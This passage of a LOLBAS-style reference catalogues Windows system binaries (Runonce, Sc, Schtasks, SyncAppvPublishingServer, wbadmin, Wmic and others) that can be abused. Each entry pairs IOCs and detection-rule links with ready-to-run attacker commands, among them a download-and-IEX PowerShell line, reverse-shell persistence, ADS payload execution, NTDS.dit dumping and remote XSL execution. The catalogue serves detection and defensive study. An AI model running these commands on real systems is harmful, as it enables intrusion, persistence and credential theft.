- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Runonce.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Runonce.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Runonce.yml`
- **Default Windows Paths:** `C:\Windows\System32\runonce.exe`, `C:\Windows\SysWOW64\runonce.exe`
- **Key Forensic / Hunt IOCs:** `Registy key add - HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\YOURKEY`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/registry/registry_event/registry_event_runonce_persistence.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_runonce_execution.yml), [Elastic](https://github.com/elastic/detection-rules/blob/2926e98c5d998706ef7e248a63fb0367c841f685/rules/windows/persistence_run_key_and_startup_broad.toml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218` | `Administrator` | `Runonce.exe /AlternateShellStartup` | Persistence, bypassing defensive counter measures |

### `Runscripthelper.exe` (`yml/OSBinaries/Runscripthelper.yml`)
- **Description:** Execute target PowerShell script
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Runscripthelper.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Runscripthelper.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Runscripthelper.yml`
- **Default Windows Paths:** `C:\Windows\WinSxS\amd64_microsoft-windows-u..ed-telemetry-client_31bf3856ad364e35_10.0.16299.15_none_c2df1bba78111118\Runscripthelper.exe`, `C:\Windows\WinSxS\amd64_microsoft-windows-u..ed-telemetry-client_31bf3856ad364e35_10.0.16299.192_none_ad4699b571e00c4a\Runscripthelper.exe`
- **Key Forensic / Hunt IOCs:** `Event 4014 - Powershell logging`; `Event 400`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_runscripthelper.yml), [BlockRule](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218` | `User` | `runscripthelper.exe surfacecheck \\?\C:\Test\Microsoft\Diagnosis\scripts\test.txt C:\Test` | Bypass constrained language mode and execute Powershell script |

### `Sc.exe` (`yml/OSBinaries/Sc.yml`)
- **Description:** Used by Windows to manage services
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Sc.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Sc.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Sc.yml`
- **Default Windows Paths:** `C:\Windows\System32\sc.exe`, `C:\Windows\SysWOW64\sc.exe`
- **Key Forensic / Hunt IOCs:** `Unexpected service creation`; `Unexpected service modification`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_susp_service_creation.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_sc_change_sevice_image_path_by_non_admin.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_sc_service_path_modification.yml), [Splunk](https://github.com/splunk/security_content/blob/18f63553a9dc1a34122fa123deae2b2f9b9ea391/detections/endpoint/sc_exe_manipulating_windows_services.yml), [Elastic](https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/lateral_movement_cmd_service.toml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **ADS** | `T1564.004` | `User` | `sc create evilservice binPath="\"c:\\ADS\\file.txt:cmd.exe\" /c echo works > \"c:\ADS\works.txt\"" DisplayName= "evilservice" start= auto\ & sc start evilservice` | Execute binary file hidden inside an alternate data stream |
| **ADS** | `T1564.004` | `User` | `sc config <existing> binPath="\"c:\\ADS\\file.txt:cmd.exe\" /c echo works > \"c:\ADS\works.txt\"" & sc start <existing>` | Execute binary file hidden inside an alternate data stream |

### `Schtasks.exe` (`yml/OSBinaries/Schtasks.yml`)
- **Description:** Schedule periodic tasks
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Schtasks.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Schtasks.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Schtasks.yml`
- **Default Windows Paths:** `c:\windows\system32\schtasks.exe`, `c:\windows\syswow64\schtasks.exe`
- **Key Forensic / Hunt IOCs:** `Suspicious task creation events`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_schtasks_creation.yml), [Elastic](https://github.com/elastic/detection-rules/blob/ef7548f04c4341e0d1a172810330d59453f46a21/rules/windows/persistence_local_scheduled_task_creation.toml), [Splunk](https://github.com/splunk/security_content/blob/18f63553a9dc1a34122fa123deae2b2f9b9ea391/detections/endpoint/schtasks_scheduling_job_on_remote_system.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1053.005` | `User` | `schtasks /create /sc minute /mo 1 /tn "Reverse shell" /tr c:\some\directory\revshell.exe` | Create a recurring task to keep reverse shell session(s) alive |
| **Execute** | `T1053.005` | `Administrator` | `schtasks /create /s targetmachine /tn "MyTask" /tr c:\some\directory\notevil.exe /sc daily` | Create a remote task to run daily relative to the the time of creation |

### `Scriptrunner.exe` (`yml/OSBinaries/Scriptrunner.yml`)
- **Description:** Execute binary through proxy binary to evade defensive counter measures
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Scriptrunner.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Scriptrunner.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Scriptrunner.yml`
- **Default Windows Paths:** `C:\Windows\System32\scriptrunner.exe`, `C:\Windows\SysWOW64\scriptrunner.exe`
- **Key Forensic / Hunt IOCs:** `Scriptrunner.exe should not be in use unless App-v is deployed`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_servu_susp_child_process.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1202` | `User` | `Scriptrunner.exe -appvscript calc.exe` | Execute binary through proxy binary to evade defensive counter measures |
| **Execute** | `T1218` | `User` | `ScriptRunner.exe -appvscript "\\fileserver\calc.cmd"` | Execute binary through proxy binary from external server to evade defensive counter measures |

### `Setres.exe` (`yml/OSBinaries/Setres.yml`)
- **Description:** Configures display settings
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Setres.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Setres.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Setres.yml`
- **Default Windows Paths:** `c:\windows\system32\setres.exe`
- **Key Forensic / Hunt IOCs:** `Unusual location for choice.exe file`; `Process created from choice.com binary`; `Existence of choice.cmd file`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/19396788dbedc57249a46efed2bb1927abc376d4/rules/windows/process_creation/proc_creation_win_lolbin_setres.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218` | `User` | `setres.exe -w 800 -h 600` | Executes arbitrary code |

### `SettingSyncHost.exe` (`yml/OSBinaries/SettingSyncHost.yml`)
- **Description:** Host Process for Setting Synchronization
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/SettingSyncHost.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/SettingSyncHost.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/SettingSyncHost.yml`
- **Default Windows Paths:** `C:\Windows\System32\SettingSyncHost.exe`, `C:\Windows\SysWOW64\SettingSyncHost.exe`
- **Key Forensic / Hunt IOCs:** `SettingSyncHost.exe should not be run on a normal workstation`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_settingsynchost.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218` | `User` | `SettingSyncHost -LoadAndRunDiagScript anything` | Can be used to evade defensive countermeasures or to hide as a persistence mechanism |
| **Execute** | `T1218` | `User` | `SettingSyncHost -LoadAndRunDiagScriptNoCab anything` | Can be used to evade defensive countermeasures or to hide as a persistence mechanism. Additionally, effectively act as a -WindowStyle Hidden option (as there is in PowerShell) for any arbitrary batch file. |

### `ssh.exe` (`yml/OSBinaries/Ssh.yml`)
- **Description:** Ssh.exe is the OpenSSH compatible client can be used to connect to Windows 10 (build 1809 and later) and Windows Server 2019 devices.
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Ssh.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Ssh.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Ssh.yml`
- **Default Windows Paths:** `c:\windows\system32\OpenSSH\ssh.exe`
- **Key Forensic / Hunt IOCs:** `Event ID 4624 with process name C:\Windows\System32\OpenSSH\sshd.exe.`; `command line arguments specifying execution.`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_ssh.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1202` | `User` | `ssh localhost calc.exe` | Execute specified command, can be used for defense evasion. |
| **Execute** | `T1202` | `User` | `ssh -o ProxyCommand=calc.exe .` | Performs execution of specified file, can be used as a defensive evasion. |

### `Stordiag.exe` (`yml/OSBinaries/Stordiag.yml`)
- **Description:** Storage diagnostic tool
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Stordiag.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Stordiag.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Stordiag.yml`
- **Default Windows Paths:** `c:\windows\system32\stordiag.exe`, `c:\windows\syswow64\stordiag.exe`
- **Key Forensic / Hunt IOCs:** `systeminfo.exe, fltmc.exe or schtasks.exe being executed outside of their normal path of c:\windows\system32\ or c:\windows\syswow64\`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_stordiag_susp_child_process.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218` | `User` | `stordiag.exe` | Possible defence evasion purposes. |

### `SyncAppvPublishingServer.exe` (`yml/OSBinaries/Syncappvpublishingserver.yml`)
- **Description:** Used by App-v to get App-v server lists
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Syncappvpublishingserver.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Syncappvpublishingserver.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Syncappvpublishingserver.yml`
- **Default Windows Paths:** `C:\Windows\System32\SyncAppvPublishingServer.exe`, `C:\Windows\SysWOW64\SyncAppvPublishingServer.exe`
- **Key Forensic / Hunt IOCs:** `SyncAppvPublishingServer.exe should never be in use unless App-V is deployed`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/powershell/powershell_script/posh_ps_syncappvpublishingserver_exe.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/powershell/powershell_module/posh_pm_syncappvpublishingserver_exe.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_syncappvpublishingserver_execute_psh.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218` | `User` | `SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') \| IEX"` | Use SyncAppvPublishingServer as a Powershell host to execute Powershell code. Evade defensive counter measures |

### `Tar.exe` (`yml/OSBinaries/Tar.yml`)
- **Description:** Used by Windows to extract and create archives.
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Tar.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Tar.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Tar.yml`
- **Default Windows Paths:** `C:\Windows\System32\tar.exe`, `C:\Windows\SysWOW64\tar.exe`
- **Key Forensic / Hunt IOCs:** `tar.exe extracting files from a remote host within the environment`; `Abnormal processes spawning tar.exe`; `tar.exe interacting with alternate data streams (ADS)`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/e1a713d264ac072bb76b5c4e5f41315a015d3f41/rules/windows/process_creation/proc_creation_win_tar_compression.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/e1a713d264ac072bb76b5c4e5f41315a015d3f41/rules/windows/process_creation/proc_creation_win_tar_extraction.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **ADS** | `T1564.004` | `User` | `tar -cf compressedfilename:ads C:\folder\file` | Can be used to evade defensive countermeasures, or to hide as part of a persistence mechanism |
| **ADS** | `T1564.004` | `User` | `tar -xf compressedfilename:ads` | Can be used to evade defensive countermeasures, or to hide as part of a persistence mechanism |
| **Copy** | `T1105` | `User` | `tar -xf \\host1\archive.tar` | Copy files |

### `Ttdinject.exe` (`yml/OSBinaries/Ttdinject.yml`)
- **Description:** Used by Windows 1809 and newer to Debug Time Travel (Underlying call of tttracer.exe)
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Ttdinject.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Ttdinject.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Ttdinject.yml`
- **Default Windows Paths:** `C:\Windows\System32\ttdinject.exe`, `C:\Windows\Syswow64\ttdinject.exe`
- **Key Forensic / Hunt IOCs:** `Parent child relationship. Ttdinject.exe parent for executed command`; `Multiple queries made to the IFEO registry key of an untrusted executable (Ex. "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\payload.exe") from the ttdinject.exe process`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/create_remote_thread/create_remote_thread_win_ttdinjec.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/7ea6ed3db65e0bd812b051d9bb4fffd27c4c4d0a/rules/windows/process_creation/proc_creation_win_lolbin_ttdinject.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1127` | `Administrator` | `TTDInject.exe /ClientParams "7 tmp.run 0 0 0 0 0 0 0 0 0 0" /Launch "C:/Windows/System32/calc.exe"` | Spawn process using other binary |
| **Execute** | `T1127` | `Administrator` | `ttdinject.exe /ClientScenario TTDRecorder /ddload 0 /ClientParams "7 tmp.run 0 0 0 0 0 0 0 0 0 0" /launch "C:/Windows/System32/calc.exe"` | Spawn process using other binary |

### `Tttracer.exe` (`yml/OSBinaries/Tttracer.yml`)
- **Description:** Used by Windows 1809 and newer to Debug Time Travel
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Tttracer.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Tttracer.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Tttracer.yml`
- **Default Windows Paths:** `C:\Windows\System32\tttracer.exe`, `C:\Windows\SysWOW64\tttracer.exe`
- **Key Forensic / Hunt IOCs:** `Parent child relationship. Tttracer parent for executed command`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_tttracer_mod_load.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/image_load/image_load_tttracer_mod_load.yml), [Elastic](https://github.com/elastic/detection-rules/blob/5bdf70e72c6cd4547624c521108189af994af449/rules/windows/credential_access_cmdline_dump_tool.toml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1127` | `Administrator` | `tttracer.exe C:\windows\system32\calc.exe` | Spawn process using other binary |
| **Dump** | `T1003` | `Administrator` | `TTTracer.exe -dumpFull -attach pid` | Dump process by PID |

### `Unregmp2.exe` (`yml/OSBinaries/Unregmp2.yml`)
- **Description:** Microsoft Windows Media Player Setup Utility
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Unregmp2.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Unregmp2.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Unregmp2.yml`
- **Default Windows Paths:** `C:\Windows\System32\unregmp2.exe`, `C:\Windows\SysWOW64\unregmp2.exe`
- **Key Forensic / Hunt IOCs:** `Low-prevalence binaries, with filename 'wmpnscfg.exe', spawned as child-processes of `unregmp2.exe /HideWMP``
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/197615345b927682ab7ad7fa3c5f5bb2ed911eed/rules/windows/process_creation/proc_creation_win_lolbin_unregmp2.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1202` | `User` | `rmdir %temp%\lolbin /s /q 2>nul & mkdir "%temp%\lolbin\Windows Media Player" & copy C:\Windows\System32\calc.exe "%temp%\lolbin\Windows Media Player\wmpnscfg.exe" >nul && cmd /V /C "set "ProgramW6432=%temp%\lolbin" && unregmp2.exe /HideWMP"` | Proxy execution of binary |

### `vbc.exe` (`yml/OSBinaries/Vbc.yml`)
- **Description:** Binary file used for compile vbs code
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Vbc.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Vbc.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Vbc.yml`
- **Default Windows Paths:** `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\vbc.exe`, `C:\Windows\Microsoft.NET\Framework64\v3.5\vbc.exe`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_visual_basic_compiler.yml), [Elastic](https://github.com/elastic/detection-rules/blob/61afb1c1c0c3f50637b1bb194f3e6fb09f476e50/rules/windows/defense_evasion_dotnet_compiler_parent_process.toml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Compile** | `T1127` | `User` | `vbc.exe /target:exe c:\temp\vbs\run.vb` | Compile attacker code on system. Bypass defensive counter measures. |
| **Compile** | `T1127` | `User` | `vbc -reference:Microsoft.VisualBasic.dll c:\temp\vbs\run.vb` | Compile attacker code on system. Bypass defensive counter measures. |

### `Verclsid.exe` (`yml/OSBinaries/Verclsid.yml`)
- **Description:** Used to verify a COM object before it is instantiated by Windows Explorer
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Verclsid.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Verclsid.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Verclsid.yml`
- **Default Windows Paths:** `C:\Windows\System32\verclsid.exe`, `C:\Windows\SysWOW64\verclsid.exe`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_verclsid_runs_com.yml), [Splunk](https://github.com/splunk/security_content/blob/a1afa0fa605639cbef7d528dec46ce7c8112194a/detections/endpoint/verclsid_clsid_execution.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218.012` | `User` | `verclsid.exe /S /C {CLSID}` | Run a com object created in registry to evade defensive counter measures |

### `Wab.exe` (`yml/OSBinaries/Wab.yml`)
- **Description:** Windows address book manager
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Wab.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Wab.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Wab.yml`
- **Default Windows Paths:** `C:\Program Files\Windows Mail\wab.exe`, `C:\Program Files (x86)\Windows Mail\wab.exe`
- **Key Forensic / Hunt IOCs:** `WAB.exe should normally never be used`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/registry/registry_set/registry_set_wab_dllpath_reg_change.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218` | `Administrator` | `wab.exe` | Execute dll file. Bypass defensive counter measures |

### `wbadmin.exe` (`yml/OSBinaries/Wbadmin.yml`)
- **Description:** Windows Backup Administration utility
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Wbadmin.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Wbadmin.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Wbadmin.yml`
- **Default Windows Paths:** `C:\Windows\System32\wbadmin.exe`
- **Key Forensic / Hunt IOCs:** `wbadmin.exe command lines containing "NTDS" or "NTDS.dit"`

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Dump** | `T1003.003` | `Administrator, Backup Operators, SeBackupPrivilege` | `wbadmin start backup -backupTarget:C:\temp\ -include:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -quiet` | Snapshoting of Active Directory NTDS.dit database |
| **Dump** | `T1003.003` | `Administrator, Backup Operators, SeBackupPrivilege` | `wbadmin start recovery -version:<VERSIONIDENTIFIER> -recoverytarget:C:\temp -itemtype:file -items:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -notRestoreAcl -quiet` | Dumping of Active Directory NTDS.dit database |

### `winget.exe` (`yml/OSBinaries/Winget.yml`)
- **Description:** Windows Package Manager tool
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Winget.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Winget.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Winget.yml`
- **Default Windows Paths:** `C:\Users\user\AppData\Local\Microsoft\WindowsApps\winget.exe`
- **Key Forensic / Hunt IOCs:** `winget.exe spawned with local manifest file`; `Sysmon Event ID 1 - Process Creation`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_winget_local_install_via_manifest.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1105` | `Local Aministrator - required to enabled local manifest setting` | `winget.exe install --manifest manifest.yml` | Download and execute an arbitrary file from the internet |

### `Wlrmdr.exe` (`yml/OSBinaries/Wlrmdr.yml`)
- **Description:** Windows Logon Reminder executable
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Wlrmdr.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Wlrmdr.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Wlrmdr.yml`
- **Default Windows Paths:** `c:\windows\system32\wlrmdr.exe`
- **Key Forensic / Hunt IOCs:** `wlrmdr.exe spawning any new processes`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_wlrmdr.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1202` | `User` | `wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u calc.exe` | Use wlrmdr as a proxy binary to evade defensive countermeasures |

### `Wmic.exe` (`yml/OSBinaries/Wmic.yml`)
- **Description:** The WMI command-line (WMIC) utility provides a command-line interface for WMI
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Wmic.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Wmic.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Wmic.yml`
- **Default Windows Paths:** `C:\Windows\System32\wbem\wmic.exe`, `C:\Windows\SysWOW64\wbem\wmic.exe`
- **Key Forensic / Hunt IOCs:** `Wmic retrieving scripts from remote system/Internet location`; `DotNet CLR libraries loaded into wmic.exe`; `DotNet CLR Usage Log - wmic.exe.log`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/image_load/image_load_wmic_remote_xsl_scripting_dlls.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_wmic_xsl_script_processing.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_wmic_squiblytwo_bypass.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_wmic_eventconsumer_creation.yml), [Elastic](https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_suspicious_wmi_script.toml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **ADS** | `T1564.004` | `User` | `wmic.exe process call create "c:\ads\file.txt:program.exe"` | Execute binary file hidden in Alternate data streams to evade defensive counter measures |
| **Execute** | `T1218` | `User` | `wmic.exe process call create calc` | Execute binary from wmic to evade defensive counter measures |
| **Execute** | `T1218` | `User` | `wmic.exe /node:"192.168.0.1" process call create "evil.exe"` | Execute binary on a remote system |
| **Execute** | `T1218` | `User` | `wmic.exe process get brief /format:"https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSBinaries/Payload/Wmic_calc.xsl"` | Execute binary on remote system |
| **Execute** | `T1218` | `User` | `wmic.exe process get brief /format:"\\127.0.0.1\c$\Tools\pocremote.xsl"` | Execute script from remote system |

### `WorkFolders.exe` (`yml/OSBinaries/WorkFolders.yml`)
- **Description:** Work Folders
